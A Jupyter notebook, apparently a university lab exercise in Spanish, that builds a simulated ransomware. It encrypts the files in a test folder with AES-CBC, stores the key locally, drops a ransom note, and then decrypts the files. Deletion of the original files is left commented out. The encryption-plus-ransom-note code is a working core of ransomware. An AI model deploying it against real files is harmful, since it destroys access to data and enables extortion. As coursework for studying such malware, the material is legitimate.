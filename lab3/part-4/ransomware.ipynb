{
 "cells": [
  {
   "metadata": {},
   "cell_type": "markdown",
   "source": [
    "# Laboratorio 2 - Parte 4: Implementación de un Ransomware Simulado\n",
    "## Cifrado de Información\n",
    "### José Daniel Gómez Cabrera 21429"
   ],
   "id": "24aeee840efaf82d"
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-03-18T03:55:42.898910Z",
     "start_time": "2025-03-18T03:55:42.891109Z"
    }
   },
   "cell_type": "code",
   "source": [
    "import os\n",
    "import secrets\n",
    "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\n",
    "from cryptography.hazmat.primitives import padding\n",
    "from cryptography.hazmat.backends import default_backend\n",
    "import base64"
   ],
   "id": "fc93132d8305124",
   "outputs": [],
   "execution_count": 40
  },
  {
   "metadata": {},
   "cell_type": "markdown",
   "source": [
    "### Crear un script que cifre archivos de texto con AES\n",
    "- Prueben realizar el script en un folder con varios archivos"
   ],
   "id": "a869793940daab8e"
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-03-18T03:55:42.909702Z",
     "start_time": "2025-03-18T03:55:42.907385Z"
    }
   },
   "cell_type": "code",
   "source": [
    "def generate_key():\n",
    "    return secrets.token_bytes(32)  # 256 bits = 32 bytes"
   ],
   "id": "b4a7215c202d591f",
   "outputs": [],
   "execution_count": 41
  },
  {
   "metadata": {},
   "cell_type": "markdown",
   "source": "#### Encriptar los 3 archivos del folder \"directory\"",
   "id": "70568f03e879e6e7"
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-03-18T03:55:42.919634Z",
     "start_time": "2025-03-18T03:55:42.916253Z"
    }
   },
   "cell_type": "code",
   "source": [
    "def encrypt_file(file_path, key):\n",
    "    try:\n",
    "        iv = secrets.token_bytes(16)\n",
    "\n",
    "        with open(file_path, 'rb') as f:\n",
    "            data = f.read()\n",
    "\n",
    "        padder = padding.PKCS7(algorithms.AES.block_size).padder()\n",
    "        padded_data = padder.update(data) + padder.finalize()\n",
    "\n",
    "        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())\n",
    "        encryptor = cipher.encryptor()\n",
    "        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()\n",
    "\n",
    "        encrypted_with_iv = iv + encrypted_data\n",
    "\n",
    "        with open(file_path + '.encrypted', 'wb') as f:\n",
    "            f.write(encrypted_with_iv)\n",
    "\n",
    "        # un ransomware real eliminaria el archivo original, pero lo dejo por propositos de demostracion del laboratorio\n",
    "        # os.remove(file_path)\n",
    "\n",
    "        return True\n",
    "    except Exception as e:\n",
    "        print(f\"Error al cifrar {file_path}: {e}\")\n",
    "        return False"
   ],
   "id": "fbc42aaa8cd2814b",
   "outputs": [],
   "execution_count": 42
  },
  {
   "metadata": {},
   "cell_type": "markdown",
   "source": "#### Encriptamos los archivos (simulando un ransomware)",
   "id": "c9ffafec6f200d9b"
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-03-18T03:55:42.929724Z",
     "start_time": "2025-03-18T03:55:42.924284Z"
    }
   },
   "cell_type": "code",
   "source": [
    "directory = \"directory\"\n",
    "os.makedirs(directory, exist_ok=True)\n",
    "\n",
    "test_files = [\"file_1.txt\", \"file_2.txt\", \"file_3.txt\"]\n",
    "for file in test_files:\n",
    "    file_path = os.path.join(directory, file)\n",
    "    if not os.path.exists(file_path):\n",
    "        with open(file_path, 'w') as f:\n",
    "            f.write(f\"Este es un archivo de prueba: {file}\")\n",
    "        print(f\"Archivo creado: {file_path}\")\n",
    "\n",
    "# la clave es aleatoria para que sea mas dificil descifrarlo a la fuerza\n",
    "key = generate_key()\n",
    "with open('key.bin', 'wb') as f:\n",
    "    f.write(key)\n",
    "print(f\"Clave generada y guardada en 'key.bin'\")\n",
    "\n",
    "# ciframos todos los archivos, recorriendolos con os.listdir\n",
    "count = 0\n",
    "for file in os.listdir(directory):\n",
    "    file_path = os.path.join(directory, file)\n",
    "    if os.path.isfile(file_path) and not file.endswith('.encrypted'):\n",
    "        if encrypt_file(file_path, key):\n",
    "            count += 1\n",
    "            print(f\"Archivo cifrado: {file_path}\")\n",
    "\n",
    "# es necesario un archivo de rescate para que nuestra 'victima' pueda entender que hacer\n",
    "with open(os.path.join('RESCATE.txt'), 'w') as f:\n",
    "    f.write(\"¡Tus archivos han sido cifrados!\\n\")\n",
    "    f.write(\"Este es un simulacro educativo de ransomware.\\n\")\n",
    "    f.write(\"Utiliza el script para desencriptar con la clave que esta en key.bin para recuperar tus archivos.\\n\")\n",
    "\n",
    "print(f\"\\n{count} archivos han sido cifrados.\")\n",
    "print(\"Dejado mensaje de rescate en RESCATE.txt\")"
   ],
   "id": "d01ff350e8924c52",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Clave generada y guardada en 'key.bin'\n",
      "Archivo cifrado: directory/file_1.txt\n",
      "Archivo cifrado: directory/file_2.txt\n",
      "Archivo cifrado: directory/file_3.txt\n",
      "\n",
      "3 archivos han sido cifrados.\n",
      "Dejado mensaje de rescate en RESCATE.txt\n"
     ]
    }
   ],
   "execution_count": 43
  },
  {
   "metadata": {},
   "cell_type": "markdown",
   "source": "### Implementar una clave de descifrado en otro script.",
   "id": "4835a7c1a2e49593"
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-03-18T03:55:42.956076Z",
     "start_time": "2025-03-18T03:55:42.953627Z"
    }
   },
   "cell_type": "code",
   "source": [
    "def decrypt_file(file_path, key):\n",
    "    try:\n",
    "        if not file_path.endswith('.encrypted'):\n",
    "            print(f\"Omitiendo {file_path} - no parece ser un archivo cifrado\")\n",
    "            return False\n",
    "\n",
    "        with open(file_path, 'rb') as f:\n",
    "            encrypted_data = f.read()\n",
    "\n",
    "        iv = encrypted_data[:16]\n",
    "        actual_encrypted_data = encrypted_data[16:]\n",
    "\n",
    "        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())\n",
    "        decryptor = cipher.decryptor()\n",
    "        padded_data = decryptor.update(actual_encrypted_data) + decryptor.finalize()\n",
    "\n",
    "        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()\n",
    "        original_data = unpadder.update(padded_data) + unpadder.finalize()\n",
    "\n",
    "        original_file_path = file_path[:-10]  # Remueve '.encrypted'\n",
    "        with open(original_file_path, 'wb') as f:\n",
    "            f.write(original_data)\n",
    "\n",
    "        # deberia eliminarlo pero lo dejo por propositos de demostracion del laboratorio\n",
    "        # os.remove(file_path)\n",
    "\n",
    "        return True\n",
    "    except Exception as e:\n",
    "        print(f\"Error al descifrar {file_path}: {e}\")\n",
    "        return False\n"
   ],
   "id": "4dcaae2054deec83",
   "outputs": [],
   "execution_count": 44
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-03-18T03:55:44.263370Z",
     "start_time": "2025-03-18T03:55:42.964021Z"
    }
   },
   "cell_type": "code",
   "source": [
    "input(\"Presiona Enter para descifrar los archivos!!!\")\n",
    "\n",
    "directory = \"directory\"\n",
    "\n",
    "# Lee la clave del archivo key.bin\n",
    "try:\n",
    "    with open('key.bin', 'rb') as f:\n",
    "        key = f.read()\n",
    "except FileNotFoundError:\n",
    "    print(\"Archivo de clave 'key.bin' no encontrado.\")\n",
    "\n",
    "# Descifra todos los archivos en el directorio\n",
    "count = 0\n",
    "for file in os.listdir(directory):\n",
    "    file_path = os.path.join(directory, file)\n",
    "    if os.path.isfile(file_path) and file.endswith('.encrypted'):\n",
    "        if decrypt_file(file_path, key):\n",
    "            count += 1\n",
    "            print(f\"Archivo descifrado: {file_path}\")\n",
    "\n",
    "# deberiamos eliminar el archivo de rescate pero lo dejo por motivos de demostracion del laboratorio, para que se pueda ver los archivos de procedimiento\n",
    "# ransom_note = os.path.join(directory, 'RESCATE.txt')\n",
    "# if os.path.exists(ransom_note):\n",
    "#     os.remove(ransom_note)\n",
    "\n",
    "print(f\"\\n{count} archivos han sido descifrados exitosamente.\")"
   ],
   "id": "2711d08a5de32c38",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Archivo descifrado: directory/file_3.txt.encrypted\n",
      "Archivo descifrado: directory/file_2.txt.encrypted\n",
      "Archivo descifrado: directory/file_1.txt.encrypted\n",
      "\n",
      "3 archivos han sido descifrados exitosamente.\n"
     ]
    }
   ],
   "execution_count": 45
  }
 ],
 "metadata": {
  "kernelspec": {
   "name": "python3",
   "language": "python",
   "display_name": "Python 3 (ipykernel)"
  }
 },
 "nbformat": 5,
 "nbformat_minor": 9
}
